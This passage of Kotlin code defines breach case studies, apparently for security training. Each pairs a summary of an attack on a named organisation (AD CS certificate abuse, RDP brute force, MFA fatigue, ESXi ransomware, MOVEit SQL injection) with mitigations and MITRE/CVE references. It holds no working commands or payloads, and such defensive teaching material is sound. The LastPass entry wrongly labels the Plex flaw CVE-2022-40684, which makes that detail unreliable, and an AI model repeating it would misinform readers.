            organization = "Regional Banking Group",
            year = 2023,
            industry = "Banking / Finance",
            recordsAffected = "Full Domain Control; All Customer Transaction Records Accessible",
            attackVector = "Domain Takeover via AD CS Misconfiguration (ESC1)",
            scenarioDetails = """
                • Recon: Attacker gained a low-privilege user account via phishing.
                • Escalation: Used Certify to find a misconfigured Active Directory Certificate Services template that allowed users to request certificates with arbitrary Subject Alternative Names (SAN).
                • Takeover: Requested a certificate for the 'Domain Admin' user, used it to authenticate via PKINIT, and gained full control of the Domain Controller.
            """.trimIndent(),
            threatActor = "Sophisticated eCrime Group",
            defenseMitigation = "Audit AD CS templates for 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT'. Restrict certificate issuance to authorized users only. Monitor Security Event ID 4886 for unusual SAN requests.",
            cveReferences = "MITRE T1649"
        ),
        AttackScenario(
            id = "scenario-pc-takeover-rdp",
            organization = "Engineering Firm X",
            year = 2024,
            industry = "Manufacturing / Engineering",
            recordsAffected = "Proprietary Blueprints for New Turbine Engine Stolen",
            attackVector = "PC Takeover via RDP Brute Force",
            scenarioDetails = """
                • Exposure: A workstation used for 3D rendering was accidentally exposed to the internet via RDP on port 3389.
                • Brute Force: Attackers used a list of common passwords and compromised the 'Local Admin' account.
                • Exfiltration: Once logged in, the attackers disabled Windows Defender and used 'rclone' to upload 500GB of project files to a private server.
            """.trimIndent(),
            threatActor = "Industrial Espionage Actor",
            defenseMitigation = "Never expose RDP directly to the internet; use a VPN or RD Gateway. Enforce account lockout policies for failed login attempts. Monitor for the installation of unauthorized data transfer tools.",
            cveReferences = "MITRE T1110.001, T1021.001"
        ),
        AttackScenario(
            id = "scenario-ransomware-vmware",
            organization = "Municipal Government of City Y",
            year = 2023,
            industry = "Government Services",
            recordsAffected = "All City Services (Water, Waste, Police Records) Offline",
            attackVector = "VMware ESXi Ransomware (Akira)",
            scenarioDetails = """
                • Infiltration: Attackers exploited a known vulnerability in a VPN gateway.
                • Target: Instead of individual PCs, the attackers targeted the VMWare ESXi hypervisors.
                • Impact: By encrypting the underlying VMDK files, they simultaneously took down 300 virtual servers, paralyzing the entire city infrastructure.
            """.trimIndent(),
            threatActor = "Akira Ransomware Gang",
            defenseMitigation = "Isolate hypervisor management networks. Regularly patch ESXi hosts. Use immutable storage for VM backups.",
            cveReferences = "MITRE T1486, T1567"
        ),
        AttackScenario(
            id = "breach-lastpass-2022",
            organization = "LastPass Password Manager",
            year = 2022,
            industry = "Consumer & Enterprise Password Vaults",
            recordsAffected = "Millions of Encrypted Customer Password Vaults & Company Backups",
            attackVector = "Compromised Home Media Server (Plex CVE-2022-40684) of DevOps Lead",
            scenarioDetails = """
                • Phase 1 Intrusion: Attackers breached a LastPass developer environment using compromised credentials, exfiltrating internal source code and technical documentation.
                • Targeted Home Compromise: Attackers used technical blueprints to identify one of four DevOps engineers with access to the master AWS production cloud storage keys. They exploited an unpatched remote code execution vulnerability (CVE-2022-40684) in the engineer's personal home Plex media server.
                • Keylogger & Session Hijack: Placed keylogger malware on the engineer's personal home computer, capturing the engineer's master password entered when authenticating with LastPass and bypassing MFA.
                • S3 Vault Theft: Using the engineer's active AWS IAM credentials, attackers accessed production S3 buckets, downloading encrypted password vaults, customer server addresses, and vault metadata.
            """.trimIndent(),
            threatActor = "Threat Actor Group (Sophisticated eCrime Syndicate)",
            defenseMitigation = "Require managed Zero Trust devices for administrative cloud access. Restrict production AWS keys to ephemeral sessions authenticated via hardware security tokens tied to company-issued laptops.",
            cveReferences = "CVE-2022-40684, MITRE T1056.001"
        ),
        AttackScenario(
            id = "breach-circleci-2023",
            organization = "CircleCI (DevSecOps Supply Chain)",
            year = 2023,
            industry = "Software Development / CI/CD",
            recordsAffected = "Thousands of Customer Secret Environment Variables Exposed",
            attackVector = "Malware on DevOps Engineer Laptop",
            scenarioDetails = """
                • Malware Infection: A CircleCI engineer's laptop was infected with a sophisticated infostealer that bypassed antivirus detection.
                • Session Theft: The malware stole active session cookies, allowing the attacker to impersonate the engineer and gain access to internal systems without needing a password or MFA.
                • Secret Extraction: Attackers accessed production databases and exfiltrated customer-provided secrets (API keys, AWS tokens) stored in the platform's environment variables.
            """.trimIndent(),
            threatActor = "Unknown Advanced Threat Actor",
            defenseMitigation = "Enforce hardware-based device attestation. Use ephemeral build tokens that expire in minutes. Implement 'Secrets Scanning' at the platform level to detect and rotate exposed customer keys.",
            cveReferences = "MITRE T1539, T1552.001"
        ),
        AttackScenario(
            id = "breach-twilio-phish",
            organization = "Twilio & Cloudflare Phishing",
            year = 2022,
            industry = "Communications / Cloud Services",
            recordsAffected = "Data for 125 Twilio Customers; Attempted Cloudflare Breach",
            attackVector = "SMS Phishing (Smishing) + Okta Clone",
            scenarioDetails = """
                • SMS Hook: Employees received SMS messages claiming their password had expired, directing them to a highly convincing clone of the company's Okta login page.
                • Credential Theft: The fake site captured credentials and MFA codes in real-time, relaying them to the legitimate Okta site.
                • Downstream Impact: Attackers gained access to Twilio's internal systems, allowing them to search for customer accounts and exfiltrate limited data.
            """.trimIndent(),
            threatActor = "Scattered Spider (UNC3944)",
            defenseMitigation = "Deploy FIDO2 security keys to all employees. Use SMS-filtering on corporate mobile devices. Implement 'Impossible Travel' detection in identity provider logs.",
            cveReferences = "MITRE T1566.002"
        ),
        AttackScenario(
            id = "breach-mfa-fatigue-uber",
            organization = "Uber (Full Infrastructure Takeover)",
            year = 2022,
            industry = "Transportation / Tech",
            recordsAffected = "Full Access to Slack, AWS, GCP, and HackerOne",
            attackVector = "MFA Fatigue (Push Bombing) + Social Engineering",
            scenarioDetails = """
                • The Fatigue: Attacker repeatedly sent MFA push notifications to an employee's phone for over an hour.
                • The Pretext: Attacker contacted the employee on WhatsApp, pretending to be Uber IT, and told them the notifications would stop if they approved one.
                • Master Access: Once inside, the attacker found a network share containing PowerShell scripts with hardcoded administrative credentials for the company's PAM (Privileged Access Management) system.
            """.trimIndent(),
            threatActor = "Lapsus$ (Teens / Extortion Syndicate)",
            defenseMitigation = "Disable 'blind' MFA push approvals; require 'Number Matching'. Scan internal repositories and shares for hardcoded secrets. Use vault-based secret management with just-in-time access.",
            cveReferences = "MITRE T1621, T1552.001"
        ),
        AttackScenario(
            id = "breach-fortinet-vpn",
            organization = "Global VPN Infrastructure (Fortinet)",
            year = 2023,
            industry = "Global Enterprises / Government",
            recordsAffected = "Widespread Unauthorized Access to Enterprise Intranets",
            attackVector = "Heap Buffer Overflow in FortiOS SSL-VPN (CVE-2023-27997)",
            scenarioDetails = """
                • Vulnerability: A critical heap-based buffer overflow in the SSL-VPN component of FortiOS allowed unauthenticated remote code execution.
                • Mass Scanning: Within days of discovery, state-sponsored actors began mass-scanning the internet for vulnerable devices.
                • Impact: Gaining a foothold on the VPN appliance allowed actors to bypass the firewall and pivot directly into internal corporate networks.
            """.trimIndent(),
            threatActor = "Multiple State-Linked Groups",
            defenseMitigation = "Patch FortiOS to latest version immediately. Disable SSL-VPN if not required, or restrict access to specific geo-regions and IP ranges. Monitor for abnormal outbound traffic from the VPN appliance.",
            cveReferences = "CVE-2023-27997"
        ),
        AttackScenario(
            id = "breach-mgm-2023",
            organization = "MGM Resorts International",
            year = 2023,
            industry = "Hospitality / Gaming",
            recordsAffected = "$100 Million Loss; Data of Millions of Guests Exposed",
            attackVector = "Social Engineering / Vishing of IT Helpdesk",
            scenarioDetails = """
                • Vishing: Attackers called the IT helpdesk impersonating an employee and requested an MFA reset.
                • Okta Takeover: With the reset MFA, they gained access to the corporate Okta tenant and elevated privileges.
                • Hypervisor Ransomware: They deployed ransomware directly to the ESXi hypervisors, taking down hotel systems, slot machines, and room keys.
            """.trimIndent(),
            threatActor = "Scattered Spider (UNC3944)",
            defenseMitigation = "Implement strict out-of-band verification for MFA resets. Enforce hardware security keys (FIDO2). Segment hypervisor management networks from corporate AD.",
            cveReferences = "MITRE T1566.004, T1486"
        ),
        AttackScenario(
            id = "breach-colonial-2021",
            organization = "Colonial Pipeline",
            year = 2021,
            industry = "Energy / Critical Infrastructure",
            recordsAffected = "Fuel Supply for US East Coast Halted; $4.4M Ransom Paid",
            attackVector = "Compromised Legacy VPN Credential",
            scenarioDetails = """
                • Initial Access: Attackers obtained a password for a legacy VPN account from a previous data leak. The account did not have MFA.
                • Data Theft: Before encrypting systems, they exfiltrated 100GB of sensitive data.
                • Operational Impact: The ransomware affected the billing systems, forcing the company to shut down the pipeline to prevent fuel theft.
            """.trimIndent(),
            threatActor = "DarkSide (eCrime Syndicate)",
            defenseMitigation = "Decommission legacy access points. Mandate MFA on all remote access. Implement air-gapped backups for industrial control systems (ICS).",
            cveReferences = "MITRE T1078.002"
        ),
        AttackScenario(
            id = "breach-change-healthcare-2024",
            organization = "Change Healthcare",
            year = 2024,
            industry = "Healthcare / Finance",
            recordsAffected = "1/3 of US Population Health Data; $22M Ransom",
            attackVector = "Stolen Credentials on Citrix Portal (No MFA)",
            scenarioDetails = """
                • Infiltration: ALPHV affiliates used stolen credentials to access a Citrix portal that lacked MFA protection.
                • Data Exfiltration: They spent 9 days on the network, exfiltrating 6TB of medical and insurance data.
                • System Wipe: Deployed ransomware that crippled prescription and billing services across the US.
            """.trimIndent(),
            threatActor = "ALPHV / BlackCat",
            defenseMitigation = "Universal MFA enforcement. Continuous Attack Surface Management (ASM). EDR on all virtual desktop infrastructure (VDI).",
            cveReferences = "MITRE T1078, T1048"
        ),
        AttackScenario(
            id = "breach-moveit-2023",
            organization = "MOVEit Transfer Users",
            year = 2023,
            industry = "Global Enterprise (2,700+ Orgs)",
            recordsAffected = "95 Million Individuals; Terabytes of Corporate Data",
            attackVector = "Zero-Day SQL Injection (CVE-2023-34362)",
            scenarioDetails = """
                • Zero-Day: Cl0p ransomware operators exploited a pre-auth SQL injection in the MOVEit web application.
                • Automated Extraction: They dropped custom webshells ('human2.aspx') that automatically exfiltrated files from Azure blob storage.
                • Pure Extortion: No encryption was used; the group relied entirely on threatening to leak stolen data.
            """.trimIndent(),
            threatActor = "Cl0p Ransomware Gang",
            defenseMitigation = "Sanitize all file transfer gateway inputs. Use WAF with virtual patching for known SQLi patterns. Move sensitive files to internal storage after transfer.",
            cveReferences = "CVE-2023-34362"
        )
    )
}
